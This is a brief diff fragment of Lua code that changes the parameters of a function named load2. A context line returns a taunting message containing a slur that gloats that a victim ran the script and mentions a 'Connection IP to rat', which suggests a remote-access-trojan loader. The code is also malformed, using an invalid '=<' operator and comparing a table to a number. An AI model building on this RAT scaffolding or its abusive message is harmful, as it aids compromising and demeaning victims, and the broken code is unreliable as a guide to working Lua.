@@ -25,7 +25,7 @@ function load(...)
   return "Retard executed the script. He will regret! Connection IP to rat/desktop: "..args.getIp
 end
 
-function load2(..., getloader1)
+function load2(...)
   local args = {...}
   local getloader1 = args.load
   if not getloader1 and args =< 1 then return false end
